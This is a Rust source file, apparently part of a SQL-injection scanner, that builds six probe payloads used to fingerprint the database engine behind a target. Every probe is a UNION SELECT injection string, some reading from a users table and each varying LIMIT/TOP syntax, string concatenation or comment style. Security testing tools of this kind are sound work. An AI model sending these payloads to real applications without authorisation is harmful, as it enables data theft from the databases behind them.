use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::types::ProbeType;

pub fn generate() -> Vec<GeneratedPayload> {
    let probes: Vec<(&str, &str, SqlClause)> = vec![
        // LIMIT vs TOP vs FETCH FIRST
        ("clause-limit", "' UNION SELECT * FROM users LIMIT 1--", SqlClause::LimitOffset),
        ("clause-top", "' UNION SELECT TOP 1 * FROM users--", SqlClause::Select),
        // CONCAT vs || vs +
        ("clause-concat-fn", "' UNION SELECT CONCAT('a','b')--", SqlClause::StringConcat),
        ("clause-concat-pipe", "' UNION SELECT 'a'||'b'--", SqlClause::StringConcat),
        // Comment styles
        ("clause-comment-dash", "' UNION SELECT 1-- comment", SqlClause::Comment),
        ("clause-comment-hash", "' UNION SELECT 1# comment", SqlClause::Comment),
    ];

    probes
        .into_iter()
        .map(|(name, payload, clause)| GeneratedPayload {
            name: name.to_string(),
            probe_type: ProbeType::ClauseVariant,
            payload_str: payload.to_string(),
            expected_dbms: None, // Verified via behavior
            clause: Some(clause),
        })
        .collect()
}
